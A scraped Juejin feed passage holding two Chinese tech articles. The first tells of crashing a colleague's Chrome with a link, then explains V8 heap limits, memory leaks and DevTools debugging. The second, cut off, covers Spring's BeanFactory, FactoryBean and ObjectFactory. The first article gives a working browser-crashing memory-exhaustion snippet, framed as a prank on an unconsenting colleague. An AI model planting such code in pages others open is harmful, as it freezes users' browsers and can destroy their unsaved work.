(max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c3a3aa71a5740e6b4db46e14137b3a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=6qAFbero3ZHZC1HP9Pe0c2S59WE%3D" alt="image_w3wbkq.webp" loading="lazy"/></p>
<p>下午茶时间，我给隔壁的后端老哥发了个链接。</p>
<p>他毫无防备地点开了。</p>
<p>三秒钟后，我听到他那台 16G 内存的 MacBook Pro 风扇开始狂啸，仿佛要起飞🤣。</p>
<p>五秒钟后，他的鼠标指针变成了彩虹圈，卡在屏幕中间动弹不得。</p>
<p>十秒钟后，Chrome 惨叫一声，弹出了那个让无数前端人闻风丧胆的页面——(崩溃啦)。</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4404d173be954a93b08999d7058cfca7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=cwyjjK99etomM8rcBj0KZqR9n7g%3D" alt="57f8a59240236884e204a1cc951a851bc8ec20f4.png" loading="lazy"/></p>
<p>后端老哥过来问我：你刚才发的是什么病毒？！😡</p>
<p>我淡定地喝了一口咖啡：没有病毒，只是一行 JavaScript 代码而已。</p>
<p>今天，我就带大家拆解一下这个崩溃背后的原理。这不仅是个恶作剧，更是深入理解 <strong>V8 引擎内存机制</strong> 的绝佳机会。</p>
<hr/>
<h3 data-id="heading-0">这行代码长什么样呢？</h3>
<p>⚠️ 高能预警：请勿在未保存工作的浏览器标签页中运行以下代码！</p>
<p>⚠️ 高能预警：请勿在未保存工作的浏览器标签页中运行以下代码！</p>
<p>⚠️ 高能预警：请勿在未保存工作的浏览器标签页中运行以下代码！</p>
<p>重要的事，先说三遍😃</p>
<p>如果你想让浏览器瞬间暴毙，其实不需要什么复杂的黑客技术。最简单粗暴的方式，就是 <strong>堆溢出 (Heap Overflow)</strong>。</p>
<p>核心代码只有这一行（为了方便展示，我稍微展开一点）：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 就是它！</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">boom</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">leakArr</span> = [];
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 分配 20MB 的 TypedArray</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">leakArr</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">20</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>));
  }, <span class="hljs-number">10</span>);
};

<span class="hljs-title function_">boom</span>();
</code></pre>
<p><strong>原理极其简单：</strong></p>
<ol>
<li>我们开了一个 <code>setInterval</code> 定时器，每 10 毫秒执行一次。</li>
<li><code>new Uint8Array(20 * 1024 * 1024)</code> 会创建一个约 20MB 的 TypedArray。</li>
<li>最关键的一步：我们将这个TypedArray <code>push</code> 进了一个<strong>全局变量</strong> <code>window.leakArr</code> 中。</li>
</ol>
<p>因为 leakArr 是挂在 window 上的，浏览器会认为：这个数据用户还要用，我不能回收！</p>
<p>于是，GC（垃圾回收器）不敢动它。</p>
<p>内存就像被注水一样瞬间飙升。</p>
<p>1秒钟增加 1GB，几秒钟后，Chrome 的 V8 引擎就会因为达到 Heap Limit（堆上限） 而崩溃。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5b32a37ab634edebf43646a0139db44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=J1Ba3ESHOpsEF8HXhC9pDPEFO0w%3D" alt="screenshot-20260113-114331.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">浏览器是怎么死的？</h3>
<p>很多兄弟会问：我电脑 32G 内存，这才哪到哪？为什么浏览器这么脆？</p>
<p>这里就要讲到 Node.js 和 Chrome V8 的一个限制。</p>
<h4 data-id="heading-2">V8 的内存限制（Heap Limit）</h4>
<p>Chrome 并不是你有多少物理内存，它就敢用多少。</p>
<p>为了防止网页占用过多资源导致系统卡死，V8 对每个页面的 JS 堆内存是有硬性限制的。</p>
<ul>
<li>在 64 位系统下，默认限制通常在 <strong>1.4GB - 4GB</strong> 之间（取决于 Chrome 版本和设备）。</li>
</ul>
<p>当你那行代码疯狂申请内存时，V8 的处理是这样的：</p>
<ul>
<li><strong>第 1 秒</strong>：内存占用 500MB。GC：还行，能撑住。</li>
<li><strong>第 2 秒</strong>：内存占用 1.5GB。GC：卧槽？快满了！赶紧 Full GC（全量回收）一下！</li>
<li><strong>第 2.1 秒</strong>：GC 发现 <code>leakArr</code> 被 <code>window</code> 引用着，<strong>一个字节都回收不掉</strong>。</li>
<li><strong>第 3 秒</strong>：内存突破限制。V8：毁灭吧，累了😖。 -&gt; <strong>Crash。</strong></li>
</ul>
<h4 data-id="heading-3">主线程阻塞 (The UI Freeze)</h4>
<p>在崩溃前，为什么鼠标会卡死？</p>
<p>因为 JS 是单线程的。</p>
<p>当内存快满时，GC 会疯狂介入，试图腾出空间。GC 的执行是会阻塞主线程的。</p>
<p>CPU 都在忙着做垃圾回收，根本没空去响应你的鼠标移动和页面渲染。</p>
<hr/>
<h3 data-id="heading-4">你可能每天都在写 Bug🤔</h3>
<p>上面的代码是明目张胆的抢劫，但在我们的日常业务代码中，更多的是 <strong>慢性偷窃</strong>——也就是<strong>内存泄漏 (Memory Leak)</strong>。</p>
<p>虽然你不会写出 <code>while(true)</code>，但以下这几种操作，和上面的性质是一样的：</p>
<h4 data-id="heading-5">忘记清除的定时器 / 监听器</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// React 组件 useEffect</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetching data...'</span>);
    <span class="hljs-comment">// 闭包引用了大量数据</span>
  }, <span class="hljs-number">1000</span>);

  <span class="hljs-comment">// 致命错误：忘记写 return () =&gt; clearInterval(timer);</span>
}, []);
</code></pre>
<p>如果你在 SPA（单页应用）里频繁切换路由，这个组件虽然卸载了，但 <code>timer</code> 还在跑，引用的数据还在内存里。切几十次路由，页面就卡成 PPT 了。</p>
<h4 data-id="heading-6">游离的 DOM 节点</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> detachedNodes = [];
<span class="hljs-keyword">function</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> ul = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'ul'</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    ul.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'li'</span>));
  }
  <span class="hljs-comment">// 虽然这个 ul 没有插入到 document.body 里</span>
  <span class="hljs-comment">// 但它被全局变量 detachedNodes 引用着，无法回收！</span>
  detachedNodes.<span class="hljs-title function_">push</span>(ul); 
}
</code></pre>
<p>很多图表库（ECharts 等）如果销毁时不调用 <code>dispose()</code>，就会留下这种内存幽灵。</p>
<h4 data-id="heading-7">3. 闭包陷阱</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> heavyData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">'*'</span>); <span class="hljs-comment">// 大数据</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'I am keeping heavyData alive!'</span>);
    <span class="hljs-comment">// 虽然 inner 只用到了 console，但因为它在 outer 内部</span>
    <span class="hljs-comment">// 有些旧引擎可能会连带把 heavyData 一起保留在闭包上下文中</span>
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-8">如何防止呢？</h3>
<p>如果不幸遇到了页面越用越卡，怎么排查是不是内存泄露？</p>
<p><strong>Chrome DevTools 是你最好的排查工具：</strong></p>
<ol>
<li>
<p><strong>打开 Performance Monitor（性能监视器）：</strong></p>
<ul>
<li><code>F12</code> -&gt; <code>Esc</code> -&gt; 选择 <code>Performance monitor</code>。</li>
<li>盯着 <strong>JS 堆</strong> 和 <strong>DOM 节点</strong>。</li>
<li>如果你做过一遍 GC（点击 Memory 面板的小垃圾桶），这两个数值<strong>只增不减</strong>，恭喜你，漏了。</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/555e26dc29404827b8c2ca98775ad09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=Vxjqi3t6VOuxanWMrbuCiG%2FsNCQ%3D" alt="screenshot-20260113-115223.png" loading="lazy"/></p>
<ol>
<li>
<p><strong>Memory 面板抓快照：</strong></p>
<ul>
<li>录制 <strong>Heap Snapshot</strong>。</li>
<li>搜索 <code>Detached</code>，看看有没有红色的游离 DOM 节点。</li>
<li>或者对比两次快照（Allocation instrumentation on timeline），看看到底是哪个对象在疯狂增长。</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ff277c7919f4e74871d6c58a3d3d1f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=6F7Mla2SkPash%2FjMYYEhwBR%2BX7g%3D" alt="screenshot-20260113-115755.png" loading="lazy"/></p>
<hr/>
<p>那行让浏览器崩溃的代码，大家玩玩就好，<strong>千万别写到生产环境里</strong>（除非你渴望被运维提着刀追杀🤣）。</p>
<p>前端工程师的价值，不只是把页面画出来，更是要保证页面在<strong>长时间运行</strong>下依然丝滑。</p>
<p>下次再遇到页面卡顿，别光顾着怪网络慢，打开控制台看看，说不定是你写的某个内存泄漏代码正在悄悄吞噬用户的内存。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02c7df1509e947b1be0bbd9c68ff51dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=T61UzpSkI%2FhGjkbRYjfKzBDbbpA%3D" alt="谢谢大家.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory]]></title>    <link>https://juejin.cn/post/7594301878828498982</link>    <guid>https://juejin.cn/post/7594301878828498982</guid>    <pubDate>2026-01-13T01:23:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594301878828498982" data-draft-id="7592615536385458210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory"/> <meta itemprop="keywords" content="后端,Spring,面试"/> <meta itemprop="datePublished" content="2026-01-13T01:23:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一旅人"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一旅人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:23:40.000Z" title="Tue Jan 13 2026 01:23:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天，代码又报错了。或者也许是昨天，我不清楚。
不管怎样，Spring 容器抛出了一个 <code>BeanCreationException</code>。为了解决它，我被迫潜入框架的深处，去注视那些平时被 <code>@Autowired</code> 掩盖的齿轮。</p>
<p>在 Spring 的世界里，存在着一种必然的复杂性。这种复杂性并非设计者的恶趣味，而是为了在一个静态的语言中构建动态世界所付出的代价。</p>
<p>在这个庞大的机器中，有三个名字极其相似的概念经常被混淆：<code>BeanFactory</code>、<code>FactoryBean</code> 和 <code>ObjectFactory</code>。这并不是命名的贫瘠，而是它们在本质上确实存在着微妙的纠缠。</p>
<p>今天，我们剥离掉那些花哨的比喻和无用的糖衣，用一种冷静的、近乎解剖学的视角，去审视这三个概念的本质。</p>
<hr/>
<h2 data-id="heading-0">一、BeanFactory：存在的容器</h2>
<p><strong>让我们首先纠正一个观念：BeanFactory 名为工厂，但其本质是容器（Container）。</strong></p>
<p>当我们谈论 Spring 容器时，我们实际上是在谈论 <code>BeanFactory</code>。它是 Spring IoC 容器的根接口，是整个世界的物理法则。</p>
<h3 data-id="heading-1">1.1 唯一的职责</h3>
<p>它的定义极其克制。它不关心业务逻辑，只关心一件事：<strong>管理对象的生命周期</strong>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BeanFactory</span> {
    Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> BeansException;
    &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name, Class&lt;T&gt; requiredType)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsBean</span><span class="hljs-params">(String name)</span>;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>当你启动一个 Spring Boot 应用时，<code>ApplicationContext</code> 就像一个充满活力的城市，而 <code>BeanFactory</code> 则是支撑这座城市的地下管网。所有的 BeanDefinition（关于 Bean 应该如何创建的蓝图）都注册在这里。</p>
<h3 data-id="heading-2">1.2 残酷的现实</h3>
<p>在大多数情况下，你不需要直接与 <code>BeanFactory</code> 对话。因为 <code>ApplicationContext</code> 已经为你封装好了一切。
但当你试图理解为什么你的 Bean 没有被正确初始化，或者为什么你的循环依赖失效时，你就必须意识到：<strong>你所有的 Bean，都只是 <code>BeanFactory</code> 中的 entries（条目）。</strong></p>
<p>它是一个巨大的 <code>Map&lt;String, BeanDefinition&gt;</code> 和 <code>Map&lt;String, Object&gt;</code> 的管理者。它冷酷无情，只按照定义的规则（Scope, Lazy, Dependence）来实例化对象。</p>
<hr/>
<h2 data-id="heading-3">二、FactoryBean：必要的欺骗</h2>
<p>如果说 <code>BeanFactory</code> 是宏观规则的制定者，那么 <code>FactoryBean</code> 就是微观规则的<strong>潜行者</strong>。</p>
<h3 data-id="heading-4">2.1 静态语言的困境</h3>
<p>想象这样一个场景：<strong>你需要注入一个接口的实现，但这个实现类并不存在于代码中，它是通过动态代理在运行时生成的。</strong>
这在 RPC 框架（如 Dubbo、Feign）和 ORM 框架（如 MyBatis）中极其常见。</p>
<p>你无法通过简单的 <code>&lt;bean class="..."&gt;</code> 或 <code>@Component</code> 来描述一个“不存在的类”。
这时候，你需要一个中间人。这个中间人表面上是一个普通的 Bean，但实际上，它是一个工厂。</p>
<h3 data-id="heading-5">2.2 伪装的艺术：以 MyBatis 为例</h3>
<p>为什么你只需要写一个 <code>UserMapper</code> 接口，就能直接 <code>@Autowired</code> 使用？
因为 Spring 容器里注册的那个 "userMapper" Bean，根本不是你的接口实现，而是一个 <code>MapperFactoryBean</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 简化的逻辑示意</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapperFactoryBean</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FactoryBean</span>&lt;T&gt; {
    
    <span class="hljs-keyword">private</span> Class&lt;T&gt; mapperInterface;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 往里跟进，最终这里发生了魔法：通过 JDK 动态代理生成接口的实</span>
        <span class="hljs-keyword">return</span> (T) Proxy.newProxyInstance(
            mapperInterface.getClassLoader(), 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] { mapperInterface }, 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapperProxy</span>&lt;&gt;()
        );
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Class&lt;?&gt; getObjectType() {
        <span class="hljs-keyword">return</span> mapperInterface;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSingleton</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h3 data-id="heading-6">2.3 这里的真相</h3>
<p>当容器调用 <code>getBean("userMapper")</code> 时，它发现这是一个 <code>FactoryBean</code>。于是，它不会返回 <code>FactoryBean</code> 实例本身，而是默默地调用 <code>getObject()</code>，并返回那个代理对象。</p>
<p>这就是欺骗。<strong>你以为你拿到了一个 Bean，其实你拿到的是 Bean 生产的产品。</strong></p>
<p>如果你渴望看到真相，看到那个操纵傀儡的幕后黑手，你需要在 Bean 名称前加上 <code>&amp;</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取的是 MapperProxy 代理对象</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">"userMapper"</span>); 

<span class="hljs-comment">// 获取的是 FactoryBean 工厂本身</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">"&amp;userMapper"</span>);
</code></pre>
<hr/>
<h2 data-id="heading-7">三、ObjectFactory：时间的延迟</h2>
<p><code>BeanFactory</code> 负责掌控空间（容器），<code>FactoryBean</code> 负责掌控构造（逻辑），而 <code>ObjectFactory</code> 则是为了掌控<strong>时间</strong>。</p>
<h3 data-id="heading-8">3.1 循环的死结</h3>
<p>在 Spring 的世界里，有一个经典的荒谬：A 需要 B，B 需要 A。
如果是构造器注入，只需坦然承认失败。但如果是 Setter 注入，Spring 试图挽救这种死结。</p>
<p>在 A 创建的过程中，需要注入 B。B 创建时，又需要注入 A。
此时 A 还在创建中，尚不是一个完整的 Bean。怎么办？
